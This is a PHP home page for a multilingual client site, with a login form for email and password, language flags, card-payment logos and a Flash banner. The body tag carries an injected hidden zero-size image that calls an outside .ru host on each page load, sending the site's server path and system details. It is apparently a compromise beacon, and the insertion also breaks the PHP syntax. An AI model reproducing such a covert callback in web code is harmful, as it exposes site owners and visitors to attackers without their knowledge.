<?php
include('lib/config.php');
include('phponline/getstatus.php');
//$_SESSION['redir'] = 'accueil.php';
//		font-size : 28pt;text-align : center;font-style: oblique;font-variant: small-caps;'>

// #BAC6E2 
if( !@$_SESSION['pascadre'] ) {
	echo
	"<?xml version='1.0' encoding='ISO-8859-1'?>
	<!DOCTYPE HTML PUBLIC '-//W3C//DTD HTML 4.01 Transitional//EN' 'http://www.w3.org/TR/html4/loose.dtd'>
	<html>
		<head>
			<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
			<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
			<meta name='description' content='".$txt['MetaDescription']."'>
			<meta name='keywords' content='".$txt['MetaKeyword']."'>
			<link href='styles/style.css' rel='stylesheet' type='text/css'>
	    	<link href='styles/accueil.css' rel='stylesheet' type='text/css' media='screen'>
			<base target='MAIN'>
	
		</head>";
}
else
	echo "<link href='styles/style.css' rel='stylesheet' type='text/css'>";
 if( !@$_SESSION['pascadre']  )
	echo "<body><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>";
?>
<table bgcolor='#f0f1f3' width='<?=$Large?>' align='<?=$Enligne?>' cellpadding='0' cellspacing='0' border='0'  >
	<tr>
	   <td height='4' colspan='3'>
			<div align='left' class='adText'><b><?=$txt['bienvenue']?></b></div>
		</td>	
	</tr>
	<tr>
		<td align='center' valign='middle' colspan='2' >
			<div align='center' class='adText'><b><?=$txt['message_acceuil']?></b></div>
		</td>
		<td align='center' valign='bottom'>
			<a href='phponline/' target="_blank">
			<img src='gifs/en_ligne.gif' border='1'/><br>
<?php
	if(get_status_PHPOnline()) 
		echo $txt['aide_en_ligne'];
	else
		echo $txt['aide_hors_ligne'];
?></a>
		</td>
	</tr>
	<tr>
		<td rowspan='2' valign='top'>
			<form method='post' action='go_connect.php'>
			<table border='0'>
				<tr>
					<td align='center' valign='middle'>
						&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<?=$txt['langage']?>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br><br>
	            <a href="entete.php?langue=Espanõl" target='TOPFNT' class="langue" ><img src='gifs/cuba.gif' border='1' alt='Espanõl'/></a>&nbsp;&nbsp; 
					<a href="entete.php?langue=English" target='TOPFNT' class="langue" ><img src='gifs/usa.gif' border='1' alt='English'/></a>&nbsp;&nbsp; 
					<a href="entete.php?langue=Français" target='TOPFNT' class="langue" ><img src='gifs/canada.gif' border='1' alt='Français'/></a></td>
				</tr>
				<tr>
					<td>
						<hr />
					</td>
				</tr>
				<tr>
					<td>
						<p class='txt'><?=$txt['acces_client']?></p>
					</td>
				</tr>
				<tr>
					<td>
						<?=$txt['form_courriel']?>
					</td>
				</tr>
				<tr>
					<td>
						<input type='text' name='courriel' value='' size='10' maxlenght='50'>
					</td>
				</tr>
				<tr>
					<td>
						<?=$txt['form_password']?>
					</td>
				</tr>
				<tr>
					<td>
						<input type='password' name='password' size='10' maxlenght='50'>
					</td>
				</tr>
				<tr>
					<td>
						<input name='connect' type='submit' value='<?=$txt['form_soumettre']?>' class='ajout_submit'>
					</td>
				</tr>
				<tr>
					<td>
						<p class='txt'>
<?php
			if( isset($_SESSION[$_SERVER['SERVER_NAME']]) ) 
				echo '<a href="client_traite.php" class="noir" target="MAIN">'.$txt['acceder_a'].' '.$txt['mon_compte'].'</a>';
			else
				echo '<a href="client_ajout.php" class="noir" target="MAIN">'.$txt['creer'].' '.$txt['mon_compte'].'</a>';
?>
						</p>
					</td>
				</tr>
				<tr>
					<td>
						<hr />
					</td>
				</tr>
				<tr>
					<td align='center' valign='bottom' colspan='3' >
						<p class='txt'>
						<img src='gifs/amex.jpg' border='0'>&nbsp;
						<img src='gifs/mastercard.jpg' border='0'>&nbsp;
						<img src='gifs/visa.jpg' border='0'><br>
						<?=$txt['carte_accepte']?></p>
					</td>
				</tr>
			</table>
			</form>
		</td>
	</tr>
	<tr>
		<td align='center' colspan='1'>
			<object classid='clsid:d27cdb6e-ae6d-11cf-96b8-444553540000' codebase='http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0' width='600' height='340' id='Main'>
			<param name='allowScriptAccess' value='sameDomain' />
			<param name='movie' value='images/accueil/padres_<?=$_SESSION['langue']?>.swf' /><param name='quality' value='high' /><param name='bgcolor' value='#ffffff' />
			<embed src='images/accueil/mother_<?=$_SESSION['langue']?>.swf' quality='high' bgcolor='#ffffff' width='600' height='200' name='Main' allowScriptAccess='sameDomain' type='application/x-shockwave-flash' pluginspage='http://www.macromedia.com/go/getflashplayer' />
			</object>
		</td>
		<td align='center' valign='top'  rowspan='1'>
			<a href='http://www.antillanatravel.com/' target='_blank'>
			<img src='images/accueil/ban_ant_travel.gif' border='0' width='90%' height='90%' ></a>
			<!-- img src='images/accueil/ban_ant_travel.gif' width='95' height='194' border='0'></a -->
		</td>
	</tr>
  	<tr> 
	  	<td colspan='3' width=100% >
				<?php include("bas_page.inc"); ?>
		</td>
	</tr>
</table>
	
<script language='JavaScript1.2'>

function Rafraichie(){
			window.location.reload();
//	open( "accueil.php", "_self" );
//	document.forms["Menu"].submit();
}

</script>

</body>
</html>
